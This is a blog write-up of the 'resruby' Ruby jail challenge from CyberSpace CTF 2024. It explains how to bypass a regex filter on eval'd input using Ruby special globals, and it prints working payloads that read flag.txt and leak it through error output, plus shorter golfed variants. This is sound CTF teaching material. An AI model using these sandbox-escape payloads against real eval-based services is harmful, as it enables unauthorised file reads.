<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta
    name="description"
    content="Personal blog about Cybersec &amp; other things."
  />
  
    
      <title>resruby - CyberSpace CTF 2024 | Salvatore Abello&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  <link rel="stylesheet" href="/css/font.css"/>
  <link rel="stylesheet" href="/css/smigle.css"/>
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <div id="root">
      <header>
  <div id="brand">
    <a class="icon-link" href="https://salvatore-abello.github.io/">
      <img
        class="icon"
        src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
      />
    </a>
    <div class="text">
      <a href="https://salvatore-abello.github.io/"><h1>Salvatore Abello&#39;s Blog</h1></a>
      <h3>Hacking &amp; other stuff</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/whoami/"><b>Whoami</b></a>
      
         | 
        <a href="/achievements/"><b>Achievements</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/cves/"><b>CVEs</b></a>
      
    
  </nav>
  <hr />
</header>

      <div id="content">
        
  <main>
    <article>
      <h1 class="title">resruby - CyberSpace CTF 2024</h1>
      
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2024-09-02 14:29:36</time>
    
    
  </strong>
  <span> • 1061 words</span>
  <span> • 5 minute read</span>
  
  
    <div>
      <span>Tags:</span>
      
        <a href="/tags/cybersec">Cybersec</a>, 
        <a href="/tags/writeup">Writeup</a>, 
        <a href="/tags/ruby">ruby</a>
    </div>
  
</div>

      <div class="content"><p>I partecipated to the first edition of <code>CyberSpace CTF</code> with <a href="https://theromanxpl0.it/">@TheRomanXpl0it</a>. It&rsquo;s always nice to see some jail challenges so, I decided to write a writeup for the challenge I liked the most: resruby.</p>
<h1 id="index">Index</h1>
<ul>
<li><a href="#overview">Overview</a>
<ul>
<li><a href="#source">Source</a></li>
<li><a href="#building-strings-from-scratch">Building strings from scratch</a></li>
<li><a href="#reading-and-leaking-the-flag">Reading and leaking the flag</a></li>
</ul>
</li>
<li><a href="#solve">Solve</a></li>
<li><a href="#flag">Flag</a></li>
<li><a href="#considerations">Considerations</a></li>
<li><a href="#resources">Resources</a></li>
</ul>
<h1 id="overview">Overview</h1>
<p>Since this challenge was in the <code>jail</code> category, it can be deduced that it requires executing arbitrary code while bypassing some checks/restrictions.</p>
<p>With that in mind, let&rsquo;s take a look at the source code</p>
<h2 id="source">Source</h2>
<p>We&rsquo;re given a single file called <code>chall.rb</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span><span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>sync <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>class<span style="color:#f92672">.</span>send(<span style="color:#e6db74">:remove_method</span>, <span style="color:#e6db74">:&lt;&lt;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;safe code &gt; &#34;</span>
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> gets<span style="color:#f92672">.</span>chomp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> code <span style="color:#f92672">=~</span> <span style="color:#e6db74">/[\w?&#39;&#34;`]/</span>
</span></span><span style="display:flex;"><span>  puts <span style="color:#e6db74">&#34;not safe&#34;</span>
</span></span><span style="display:flex;"><span>  exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;ok&#34;</span>
</span></span><span style="display:flex;"><span>eval code
</span></span></code></pre></div><p>There&rsquo;s not much going on, the only restriction is the regex <code>/[\w?'&quot;`]/</code>:</p>
<ul>
<li><code>[...]</code> - Match a single character present in the list below</li>
<li><code>\w</code> - matches any word character (equivalent to <code>[a-zA-Z0-9_]</code>)</li>
<li><code>?'&quot;`</code> matches a single character in the list</li>
</ul>
<p>With this regex it&rsquo;s impossible to execute trivial payloads to obtain RCE/Arbitrary file read.
Also, the <code>&lt;&lt;</code> method of <code>STDOUT</code> is disabled so it&rsquo;s impossible to print the flag to stdout</p>
<p>It&rsquo;s quite rare to see CTFs with a ruby ​​jail. Luckily for me, I solved a few ruby jails before so roughly I already had in mind what to do. The only tricky parts were:</p>
<ul>
<li>Building strings from scratch</li>
<li>Leaking the flag</li>
</ul>
<style type="text/css">
     
    .notice {
        --title-color: #fff;
        --title-background-color: #6be;
        --content-color: #444;
        --content-background-color: #e7f2fa;
    }

    .notice.info {
        --title-background-color: #fb7;
        --content-background-color: #fec;
    }

    .notice.tip {
        --title-background-color: #5a5;
        --content-background-color: #efe;
    }

    .notice.warning {
        --title-background-color: #c33;
        --content-background-color: #fee;
    }

     
    @media (prefers-color-scheme:dark) {
        .notice {
            --title-color: #fff;
            --title-background-color: #069;
            --content-color: #ddd;
            --content-background-color: #023;
        }

        .notice.info {
            --title-background-color: #a50;
            --content-background-color: #420;
        }

        .notice.tip {
            --title-background-color: #363;
            --content-background-color: #121;
        }

        .notice.warning {
            --title-background-color: #800;
            --content-background-color: #400;
        }
    }

    body.dark .notice {
        --title-color: #fff;
        --title-background-color: #069;
        --content-color: #ddd;
        --content-background-color: #023;
    }

    body.dark .notice.info {
        --title-background-color: #a50;
        --content-background-color: #420;
    }

    body.dark .notice.tip {
        --title-background-color: #363;
        --content-background-color: #121;
    }

    body.dark .notice.warning {
        --title-background-color: #800;
        --content-background-color: #400;
    }

    .notice {
        --title-color: #fff;
        --title-background-color: #bd31bd;
        --content-color: #ddd;
        --content-background-color: #5d0269;
    }

    .notice.info {
        --title-background-color: #a50;
        --content-background-color: #420;
    }

    .notice.tip {
        --title-background-color: #363;
        --content-background-color: #121;
    }

    .notice.warning {
        --title-background-color: #800;
        --content-background-color: #400;
    }

     
    .notice {
        padding: 18px;
        line-height: 24px;
        margin-bottom: 24px;
        border-radius: 4px;
        color: var(--content-color);
        background: var(--content-background-color);
    }

    .notice p:last-child {
        margin-bottom: 0
    }

     
    .notice-title {
        margin: -18px -18px 12px;
        padding: 4px 18px;
        border-radius: 4px 4px 0 0;
        font-weight: 700;
        color: var(--title-color);
        background: var(--title-background-color);
    }

     
    .icon-notice {
        display: inline-flex;
        align-self: center;
        margin-right: 8px;
    }

    .icon-notice img,
    .icon-notice svg {
        height: 1em;
        width: 1em;
        fill: currentColor;
    }

    .icon-notice img,
    .icon-notice.baseline svg {
        top: .125em;
        position: relative;
    }
</style><div class="notice note" >
    <p class="notice-title">
        <span class="icon-notice baseline">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 128 300 300">
  <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
</svg>

        </span>Note</p><p>The flag is inside flag.txt</p></div>

<h2 id="building-strings-from-scratch">Building strings from scratch</h2>
<p>From the previous ruby jail I learned that it&rsquo;s not required to use quotes to create strings by using this payload</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>A<span style="color:#f92672">=</span><span style="color:#e6db74">%&lt;&gt;</span>       <span style="color:#75715e"># creates an empty string</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?f</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?l</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?a</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?g</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?.</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?t</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?x</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?t</span>
</span></span><span style="display:flex;"><span>p A         <span style="color:#75715e"># it will print flag.txt</span>
</span></span></code></pre></div><p>The previous syntax is allowed in ruby but not in our case.
Another way to build strings from scratch is the following</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>A<span style="color:#f92672">=</span><span style="color:#e6db74">%&lt;&gt;</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">102</span>          <span style="color:#75715e"># f</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">108</span>          <span style="color:#75715e"># l</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">97</span>           <span style="color:#75715e"># a</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">103</span>          <span style="color:#75715e"># g</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">46</span>           <span style="color:#75715e"># .</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">116</span>          <span style="color:#75715e"># t</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">120</span>          <span style="color:#75715e"># x</span>
</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">116</span>          <span style="color:#75715e"># t</span>
</span></span></code></pre></div><p>Since we can&rsquo;t even use numbers, we need to find a way to &ldquo;build&rdquo; them.</p>
<p>I found out that ruby golf cheatsheets contain useful information to solve ruby jail challenges.
By default, ruby has some special global variables. A list of them can be found <a href="https://medium.com/ruby-golf/ruby-golf-cheatsheet-eb27ec2cdf60#Special%20variables">here</a>.</p>
<p>A variable that is useful in this case is <code>$.</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$.   <span style="color:#75715e"># The current line number of the last file from input.</span>
</span></span></code></pre></div><p>After taking our input, this variable will always contains <code>1</code>. We also need a way to store strings without using letters. By fuzzing I found out the variable $, can do so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$,   <span style="color:#75715e"># The output field separator for the print and Array#join.  Defaults to nil.</span>
</span></span></code></pre></div><p>With that in mind, I created a simple function to solve our problem:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_num</span>(f):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;+&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;$.&#39;</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(f)) <span style="color:#66d9ef">if</span> f <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;$.-$.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,=%&lt;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">102</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">108</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">97</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">103</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">46</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">116</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">120</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">116</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
</span></span></code></pre></div><div class="notice note" >
    <p class="notice-title">
        <span class="icon-notice baseline">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 128 300 300">
  <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
</svg>

        </span>Note</p><p>In our case it&rsquo;s also possible to use the variable <code>$$</code> since the pid of our process will always be 2.</p></div>

<h2 id="reading-and-leaking-the-flag">Reading and leaking the flag</h2>
<p>Now comes the trickiest part.
In order to read files we can use <a href="https://ruby-doc.org/core-2.5.1/ARGF.html">ARGF</a> which is the same as <code>$&lt;</code>. Here&rsquo;s an example:</p>
<pre tabindex="0"><code>$*&lt;&lt;&#34;flag.txt&#34;      # Put &#34;flag.txt&#34; inside ARGV
p *$&lt;               # Print the content of &#34;flag.txt&#34;
</code></pre><p>Note that <code>ARGF</code> operates on the file names inside <code>ARGV</code>.
Since we can&rsquo;t print the flag to stdout, we can leak it in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>open(open(<span style="color:#e6db74">&#34;flag.txt&#34;</span>)<span style="color:#f92672">.</span>read()) <span style="color:#75715e"># We need an equivalent payload in ruby</span>
</span></span></code></pre></div><p>I noticed that <code>$:</code> (which is the equivalent of <code>$LOAD_PATH</code>) might be useful for us. Although $: is read-only, you can replace its elements to store strings (or any value).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$: <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>         <span style="color:#75715e"># not allowed</span>
</span></span><span style="display:flex;"><span>$:<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>      <span style="color:#75715e"># allowed</span>
</span></span></code></pre></div><p>Now we have everything to write a working payload which will leak the content of <code>flag.txt.</code></p>
<h1 id="solve">Solve</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$,<span style="color:#f92672">=</span><span style="color:#e6db74">%&lt;&gt;</span>                  
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">102</span>                 <span style="color:#75715e"># f</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">108</span>                 <span style="color:#75715e"># l</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">97</span>                  <span style="color:#75715e"># a</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">103</span>                 <span style="color:#75715e"># g</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">46</span>                  <span style="color:#75715e"># .</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">116</span>                 <span style="color:#75715e"># t</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">120</span>                 <span style="color:#75715e"># x</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">116</span>                 <span style="color:#75715e"># t</span>
</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">&lt;&lt;</span>$,                  <span style="color:#75715e"># ARGV -&gt; [&#34;flag.txt&#34;]</span>
</span></span><span style="display:flex;"><span>$:<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]=*</span>$&lt;               <span style="color:#75715e"># read &#34;flag.txt&#34; and put it inside $: at index 0</span>
</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">&lt;&lt;</span>$:<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">][</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>            <span style="color:#75715e"># Put the content of flag.txt inside ARGV</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">=*</span>$&lt;                  <span style="color:#75715e"># print the flag to stderr</span>
</span></span></code></pre></div><p>Let&rsquo;s break it down</p>
<ul>
<li><code>$,=%&lt;&gt;</code> creates an empty string</li>
<li><code>$,&lt;&lt;num</code> is the equivalent of <code>$, += num.chr</code> (Eg. <code>$, += 102.chr</code> is the same as <code>$,&lt;&lt;102</code> and <code>$, += 'f'</code>)</li>
<li><code>$*</code> puts the content of <code>$,</code> (flag.txt) inside ARGV <code>($*)</code></li>
<li><code>$:[0]=*$&lt;</code> applies the splat operator <code>(*)</code> to ARGF <code>($&lt;)</code> which will read the content of files whose names are inside ARGV. Finally, it will assign those content to <code>$:</code> at index 0. Now the flag is inside <code>$:[0][0]</code></li>
<li><code>$*&lt;&lt;$:[0][0]</code> same thing as before. It will put the content of <code>$:[0][0]</code> inside ARGV</li>
<li><code>$,=*$&lt;</code> Finally, read the content of the file whose name is inside ARGV. In our case the name is the content of <code>flag.txt</code>. This will obviously raise an error (<code>Errno::ENOENT</code>), printing to stderr the flag.</li>
</ul>
<p>You can find the final payload <a href="https://gist.github.com/salvatore-abello/260c5380d55dc281c959d087718ee5ef">here</a></p>
<h1 id="flag">Flag</h1>
<pre tabindex="0"><code>CSCTF{what_was_harder?_leaking_flag_or_getting_strings}
</code></pre><h1 id="considerations">Considerations</h1>
<p>A revenge challenge has also been released where there&rsquo;s a limit of 35 characters to our input. A shorter payload could be made by reading from STDIN the flag path.
By doing so, the payload becomes (32 characters):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># read from stdin</span>
</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># read from flag.txt</span>
</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># leak the flag</span>
</span></span></code></pre></div><p>A shorter version (28 characters) of this payload would be</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># read from stdin the flag path</span>
</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># read from flag.txt</span>
</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">=*</span>$&lt;     <span style="color:#75715e"># leak the flag</span>
</span></span></code></pre></div><p>And here&rsquo;s a much shorter version (25 characters)(credits to @lydxn)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;)      <span style="color:#75715e"># read from stdin the flag path</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span><span style="color:#f92672">[*</span>$&lt;<span style="color:#f92672">]*</span>$/<span style="color:#e6db74">}</span><span style="color:#e6db74">(/</span>  <span style="color:#75715e"># leak the flag by throwing a RegexpError</span>
</span></span></code></pre></div><p>The previous payload could be shortened to 22 characters</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span><span style="color:#f92672">[*</span>$&lt;<span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">(/</span>
</span></span></code></pre></div><p>In order to make these payloads work, you have to close stdin from further reading. You can do that by pressing <code>CTRL+D</code> but it only works locally.
Since you can&rsquo;t directly send <code>CTRL+D</code> to the remote server, you can use <code>remote.shutdown</code> (Thanks to @lydxn).
I didn&rsquo;t know that <code>remote.shutdown</code> existed so I was unable to solve the revenge version.</p>
<p>But at the end, it was a fun challenge to solve ❤️</p>
<p>Thanks to the authors for the challenge and for the CTF in general.</p>
<h1 id="resources">Resources</h1>
<p>Ruby Docs - <a href="https://ruby-doc.org/">Click here</a><br>
Ruby Global Variables - <a href="https://rubyreferences.github.io/rubyref/language/globals.html">Click here</a><br>
Ruby Golf Cheatsheet - <a href="https://medium.com/ruby-golf/ruby-golf-cheatsheet-eb27ec2cdf60#Special%20variables">Click here</a><br>
Another Ruby Golf Cheatsheet - <a href="https://github.com/siman-man/ruby-golf-style-guide">Click here</a></p></div>
    </article>
  </main>

      </div>
      <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/salvatore-abello">Github</a>
      
         | 
        <a href="https://www.linkedin.com/in/salvatore-abello-411b64252/">Linkedin</a>
      
         | 
        <a href="https://x.com/salvatoreabello">X</a>
      
    </p>
  
  <p class="copyright">
    Copyright 2025. All rights reserved.
    <hr />
    <code>Made with ❤️ by <strong>Salvatore Abello</strong></code>.
  </p>
</footer>

    </div>
  </body>
</html>
